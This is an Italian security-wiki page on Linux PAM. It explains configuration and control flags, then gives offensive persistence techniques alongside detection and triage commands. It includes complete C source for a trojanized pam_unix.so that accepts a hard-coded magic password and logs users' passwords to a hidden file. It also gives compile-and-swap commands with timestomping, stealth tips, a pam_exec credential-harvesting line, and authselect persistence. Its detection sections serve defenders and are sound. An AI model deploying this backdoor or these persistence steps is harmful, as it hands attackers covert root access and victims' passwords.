# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informazioni di base

**PAM (Pluggable Authentication Modules)** è un meccanismo di sicurezza che **verifica l'identità degli utenti che tentano di accedere ai servizi informatici**, controllandone l'accesso in base a vari criteri. È simile a un guardiano digitale: garantisce che solo gli utenti autorizzati possano utilizzare determinati servizi e può limitarne l'uso per evitare il sovraccarico del sistema.

#### File di configurazione

- **Solaris** supporta il file centrale legacy `/etc/pam.conf`, ma le linee guida attuali preferiscono i file dei servizi in `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **I sistemi Linux** preferiscono un approccio basato su directory, memorizzando le configurazioni specifiche dei servizi in `/etc/pam.d`. Ad esempio, il file di configurazione del servizio login si trova in `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Una configurazione PAM di esempio per il servizio login potrebbe essere simile a questa:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Ambiti di gestione PAM**

Questi ambiti, o gruppi di gestione, includono **auth**, **account**, **password** e **session**; ciascuno è responsabile di aspetti diversi del processo di autenticazione e gestione delle sessioni:<sup>[[1]](#references)</sup>

- **Auth**: Verifica l'identità dell'utente, spesso richiedendo una password.
- **Account**: Gestisce la verifica dell'account, controllando condizioni come l'appartenenza a un gruppo o le restrizioni orarie.
- **Password**: Gestisce gli aggiornamenti delle password, inclusi i controlli di complessità e la prevenzione degli attacchi a dizionario.
- **Session**: Gestisce le azioni all'avvio o alla fine di una sessione di servizio, come il montaggio di directory o l'impostazione dei limiti delle risorse.

#### **Controlli dei moduli PAM**

I controlli determinano la risposta del modulo in caso di successo o errore, influenzando il processo di autenticazione complessivo. Includono:<sup>[[1]](#references)</sup>

- **Required**: Il fallimento di un modulo richiesto comporta un eventuale errore, ma solo dopo aver verificato tutti i moduli successivi.
- **Requisite**: Interrompe immediatamente il processo in caso di errore.
- **Sufficient**: Se nessun modulo `required` precedente è fallito, il successo viene restituito immediatamente e i moduli rimanenti nello stesso gruppo di gestione vengono ignorati.
- **Optional**: Causa un errore solo se è l'unico modulo nello stack.

#### Semantica offensiva rilevante

Quando si analizza o modifica PAM, la **posizione di una regola inserita** determina quale stack la applica:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` e `substack` importano regole da altri file: modificare `sshd` potrebbe quindi influire solo su SSH, mentre modificare `system-auth`, `common-auth` o un altro stack condiviso può influire su più servizi contemporaneamente.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM supporta anche controlli tra parentesi quadre come `[success=1 default=ignore]`. Possono essere usati per **saltare uno o più moduli** dopo il successo di un controllo personalizzato, invece di sostituire visibilmente `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` può essere **assoluto** (`/usr/lib/security/pam_custom.so`) o **relativo** alla directory predefinita dei moduli PAM. Nei sistemi Linux moderni le directory effettive sono spesso `/lib/security`, `/lib64/security`, `/usr/lib/security` o percorsi multiarchitettura come `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

In breve, per chi opera: mappare sempre l'**intero grafo dei servizi** prima di applicare una modifica. Ad esempio, `sshd -> password-auth -> system-auth` in alcune distribuzioni o `sshd -> system-remote-login -> system-login -> system-auth` in altre significa che lo stesso impianto di una sola riga può avere effetti molto più ampi del previsto.<sup>[[1]](#references)[[13]](#references)</sup>

Un modulo `auth` personalizzato può aggiungere a `sudo` una richiesta interattiva dopo la password dell'account. Prima di esaminare manualmente la richiesta, controllare lo stack effettivo di `/etc/pam.d/sudo`, le policy incluse, gli argomenti dei moduli e i permessi di eventuali file di dati locali referenziati. Un elenco di parole per la richiesta leggibile, da solo, non aggira il controllo della password né concede un'autorizzazione sudoers. Una transizione privilegiata richiede comunque l'autenticazione corretta dell'account, il completamento di ogni passaggio PAM obbligatorio e una regola sudo che consenta l'accesso root; l'enumerazione non assistita non dovrebbe attivare la richiesta.

Per la vulnerabilità legacy di Ubuntu relativa alla proprietà di [`pam_motd` (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), verificare la build effettiva di `libpam-modules` e se un servizio di login invoca il modulo di sessione interessato. Ubuntu ha corretto il problema nelle versioni **1.1.0-2ubuntu1.1** per la 9.10 e **1.1.1-2ubuntu5** per la 10.04 LTS; altre release o backport dei vendor richiedono una valutazione specifica dei pacchetti. Il percorso segnalato richiedeva che l'utente sostituisse la propria `.cache` nella home con un symlink e avviasse poi un login PAM, facendo sì che il vecchio modulo modificasse la proprietà di un target protetto. Una voce `.cache`, una riga `pam_motd.so` o una vecchia versione del kernel, da sole, non dimostrano l'esposizione; verificare il controllo della directory home, la versione effettiva del modulo, la raggiungibilità del login, la gestione dei symlink e i permessi del target, senza sostituire file né avviare un login durante l'enumerazione passiva. Vedere l'[avviso di sicurezza di Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### **Scenario di esempio**

In una configurazione con più moduli auth, il processo segue un ordine rigoroso. Se il modulo `pam_securetty` rileva che il terminale di login non è autorizzato, i login di root vengono bloccati, ma tutti i moduli vengono comunque elaborati a causa del suo stato "required". `pam_env` imposta variabili d'ambiente, migliorando potenzialmente l'esperienza dell'utente. I moduli `pam_ldap` e `pam_unix` lavorano insieme per autenticare l'utente; `pam_unix` prova a usare una password fornita in precedenza, aumentando l'efficienza e la flessibilità dei metodi di autenticazione.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` in uno stack di servizio

`pam_permit.so` restituisce esito positivo per i controlli PAM. Se un utente con privilegi inferiori può modificare la policy PAM effettiva di un servizio, inserirlo con un flag di controllo che interrompe anticipatamente lo stack di autenticazione può rimuovere il controllo della password per quel servizio. Per `sudo`, esaminare `/etc/pam.d/sudo` e qualsiasi file `common-auth` o `system-auth` incluso prima di stabilire quali servizi siano interessati. Un bypass dell'autenticazione PAM **non** concede una nuova regola sudoers; l'utente deve comunque essere autorizzato a eseguire il comando richiesto. Controllare l'ordine delle regole e gli eventuali errori `required` precedenti, invece di presumere che una singola riga `sufficient pam_permit.so` abbia sempre successo.

## Backdoor di PAM: hooking di `pam_unix.so`

Un classico trucco di persistenza in ambienti Linux di alto valore consiste nel **sostituire la libreria PAM legittima con una versione trojanizzata**. Su un host il cui stack PAM carica `pam_unix.so`, l'autenticazione SSH o da console può invocarne l'entry point `pam_sm_authenticate()`; una sostituzione malevola può acquisire le credenziali o implementare una password *magica* per aggirare l'autenticazione.<sup>[[2]](#references)[[11]](#references)</sup>

### Promemoria di compilazione
Lo schema seguente usa l'entry point di servizio `pam_sm_authenticate()` di Linux-PAM e `pam_get_authtok()` per accedere al token di autenticazione.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Esempio di trojan `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compila e sostituisci furtivamente (il pattern replacement/timestomp è documentato da Unit 42). Modifica sia il percorso di backup hard-coded nel wrapper sia i comandi seguenti in base alla directory effettiva dei moduli PAM del target:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Suggerimenti OpSec
1. **Sovrascrittura atomica** – scrivi una libreria completa in un file temporaneo e rinominalo per sostituire quello esistente, evitando di lasciare un modulo di autenticazione scritto solo parzialmente.
2. Un percorso come `/usr/bin/.dbus.log` è stato osservato nell'analisi di AuthDoor di Unit 42, quindi è anche un utile indicatore per le attività di hunting.<sup>[[2]](#references)</sup>
3. Mantieni gli entry point previsti dallo stack PAM (ad esempio, `pam_sm_authenticate` e `pam_sm_setcred`) affinché le altre operazioni di gestione continuino a funzionare.<sup>[[11]](#references)[[18]](#references)</sup>

### Rilevamento
Per i controlli di integrità dei pacchetti, RPM verifica i metadati dei file installati, `debsums -s` segnala gli errori di checksum e `dpkg -S`, nel blocco di triage, interroga la proprietà dei pacchetti; la sintassi di audit watch registra le scritture e le modifiche degli attributi di un percorso.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Confronta l'MD5/SHA256 di `pam_unix.so` con quello del pacchetto della distro.
* Usa `rpm -V pam` o `debsums -s libpam-modules` per individuare le librerie sostituite senza calcolare manualmente gli hash.
* Controlla la presenza di permessi di scrittura per tutti o proprietà insolite in `/lib/security/`.
* Regola `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Cerca nei file di configurazione PAM moduli inattesi: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

La ricerca con `pam_` non individua i moduli personalizzati con altri nomi di file `.so`. Esamina le righe **attive** `auth`, `account`, `password` e `session` in `/etc/pam.d` (e in `/etc/pam.conf`, se utilizzato), inclusi il relativo control flag e gli eventuali stack inclusi. Un modulo sconosciuto inserito come `auth sufficient` prima del normale controllo della password merita una verifica della proprietà del pacchetto e del binario; la [sintassi di controllo di PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) può far terminare anticipatamente quella parte dello stack in caso di successo. Il nome di un modulo, un timestamp insolito o l'opzione `nodelay`, da soli, non dimostrano l'esistenza di un bypass. Se il comportamento suggerisce un timing leak, esamina prima l'implementazione e la raggiungibilità del servizio; le normali attività di enumerazione non dovrebbero inviare ripetutamente tentativi di autenticazione.

### Comandi rapidi di triage (post-compromissione o threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Abuso di `pam_exec` per la persistenza
Invece di sostituire `pam_unix.so`, una modifica meno invasiva consiste nell'aggiungere una riga `pam_exec` a `/etc/pam.d/sshd`, in modo che un'invocazione che raggiunge quella riga PAM esegua un helper, lasciando intatto il normale stack.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` riceve metadati PAM in variabili d'ambiente come `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` e `PAM_TYPE`. Con `expose_authtok`, l'helper può leggere da `stdin` fino a `PAM_MAX_RESP_SIZE` byte della password durante le fasi `auth` o `password`. Se vuoi che l'helper venga eseguito con l'UID effettivo invece che con quello reale, aggiungi `seteuid`.<sup>[[4]](#references)</sup>

Seguono alcune note pratiche sui tipi di modulo e sul filtro `type=` documentati per `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` è preferibile per **azioni post-login**, come riaprire socket o avviare un daemon in background.
- `auth optional pam_exec.so quiet expose_authtok ...` è la scelta abituale per la **raccolta delle credenziali**, perché viene eseguito prima dell'apertura della sessione.
- È possibile usare `type=session` o `type=auth` per limitare l'esecuzione a una fase PAM specifica ed evitare esecuzioni duplicate indesiderate.

Per la revisione dei privilegi, un percorso assoluto a un helper `pam_exec.so` scrivibile dall'utente attuale è un candidato anche quando il file è contrassegnato come append-only (`a`): [l'attributo consente l'aggiunta di contenuto](https://man7.org/linux/man-pages/man1/chattr.1.html), cosa che può bastare a modificare il comportamento successivo di uno script shell. Verifica innanzitutto che il servizio PAM e l'evento raggiungano effettivamente quella riga, che l'helper e il percorso della directory padre siano attendibili e che il comando venga eseguito con un'identità dotata di privilegi maggiori; [`seteuid` cambia l'UID PAM utilizzato](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Un file scrivibile o il risultato di `lsattr`, da soli, non dimostrano un'esecuzione privilegiata.

### Resistere agli strumenti della distribuzione: `authselect`

Sui sistemi della famiglia RHEL e Fedora che usano `authselect`, le modifiche dirette a file generati come `/etc/pam.d/system-auth` o `/etc/pam.d/password-auth` possono essere **sovrascritte da `authselect`**. Per mantenere le modifiche, gli operatori spesso applicano patch al profilo personalizzato attivo in `/etc/authselect/custom/<profile>/` e poi lo selezionano nuovamente.<sup>[[5]](#references)[[19]](#references)</sup>

Flusso di lavoro tipico con accesso root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Questo è importante sia per l'attacco sia per il triage: se `/etc/pam.d/system-auth` contiene il banner `Generated by authselect` e `Do not modify this file manually`, il vero punto di persistenza potrebbe trovarsi in `/etc/authselect/custom/` anziché in `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Recenti tradecraft osservati in-the-wild

Le recenti segnalazioni del 2025 sulla backdoor Linux **Plague** hanno mostrato la stessa idea di base portata oltre: un componente PAM malevolo con una **password di bypass statica**, oltre alla pulizia delle variabili d'ambiente relative a SSH e della cronologia della shell (`HISTFILE=/dev/null`), per ridurre le tracce della sessione dopo il login.<sup>[[3]](#references)</sup> È un utile schema di ricerca perché la logica della backdoor può risiedere in PAM, mentre gli artefatti di stealth compaiono solo **dopo** che l'autenticazione è riuscita.


## References

- [1] [pam.conf(5) / pam.d(5) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Il manuale dell'operatore clandestino: infiltrazione nelle reti globali di telecomunicazioni - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: una backdoor basata su PAM per Linux scoperta di recente](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configurazione dell'autenticazione utente tramite authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Pagine man di Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Pagina man di Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Pagine man di Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Gestione dell'autenticazione in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guida all'autenticazione a livello di sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Elenco dei file del pacchetto Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Pagine man di Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Modifiche/Imposizione di Authselect - Wiki del progetto Fedora](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
